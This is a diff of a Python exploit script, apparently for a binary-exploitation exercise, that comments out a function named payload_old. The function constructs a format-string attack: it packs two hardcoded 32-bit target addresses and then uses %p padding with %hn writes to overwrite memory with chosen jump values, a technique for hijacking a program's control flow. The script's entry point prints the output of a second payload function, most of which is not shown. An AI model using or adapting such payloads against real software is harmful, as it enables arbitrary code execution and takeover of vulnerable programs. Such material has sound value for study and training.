@@ -34,37 +34,37 @@ def payload():
 
     return buffer
 
-def payload_old():
-    addr_p1 = 0x080483d0
-    addr_p2 = addr_p1 + 0x2
-
-    jmp_p1 = 0x66e9
-    jmp_p2 = 0xd000
-
-    if jmp_p1 > jmp_p2:
-        jmp_p1, jmp_p2 = jmp_p2, jmp_p1
-        addr_p1, addr_p2 = addr_p2, addr_p1
-
-    print("jmp_p1:", jmp_p1)
-    print("jmp_p2:", jmp_p2)
-    buffer = pack('<I', addr_p1) + b"AAAA" + pack('<I', addr_p2)
-    written_bytes = 3 * 4
-    buffer += b"%010p%010p"
-    written_bytes += 2 * 10
-
-    print("Bytes written until now:", written_bytes, "\n" + str(buffer))
-    missing_bytes = jmp_p1 - written_bytes
-    print("Bytes to write:", missing_bytes)
-    to_write = f"%0{str(missing_bytes)}p%hn"
-    buffer += to_write.encode('utf-8')
-    written_bytes += missing_bytes
-
-    print("Bytes written until now:", written_bytes, "\n" + str(buffer))
-    missing_bytes = jmp_p2 - written_bytes
-    print("Bytes to write:", missing_bytes)
-    buffer += b"%0" + str(missing_bytes).encode('utf-8') + b"p%hn"
-
-    return buffer
+# def payload_old():
+#     addr_p1 = 0x080483d0
+#     addr_p2 = addr_p1 + 0x2
+#
+#     jmp_p1 = 0x66e9
+#     jmp_p2 = 0xd000
+#
+#     if jmp_p1 > jmp_p2:
+#         jmp_p1, jmp_p2 = jmp_p2, jmp_p1
+#         addr_p1, addr_p2 = addr_p2, addr_p1
+#
+#     print("jmp_p1:", jmp_p1)
+#     print("jmp_p2:", jmp_p2)
+#     buffer = pack('<I', addr_p1) + b"AAAA" + pack('<I', addr_p2)
+#     written_bytes = 3 * 4
+#     buffer += b"%010p%010p"
+#     written_bytes += 2 * 10
+#
+#     print("Bytes written until now:", written_bytes, "\n" + str(buffer))
+#     missing_bytes = jmp_p1 - written_bytes
+#     print("Bytes to write:", missing_bytes)
+#     to_write = f"%0{str(missing_bytes)}p%hn"
+#     buffer += to_write.encode('utf-8')
+#     written_bytes += missing_bytes
+#
+#     print("Bytes written until now:", written_bytes, "\n" + str(buffer))
+#     missing_bytes = jmp_p2 - written_bytes
+#     print("Bytes to write:", missing_bytes)
+#     buffer += b"%0" + str(missing_bytes).encode('utf-8') + b"p%hn"
+#
+#     return buffer
     
 if __name__ == '__main__':
     print(payload())
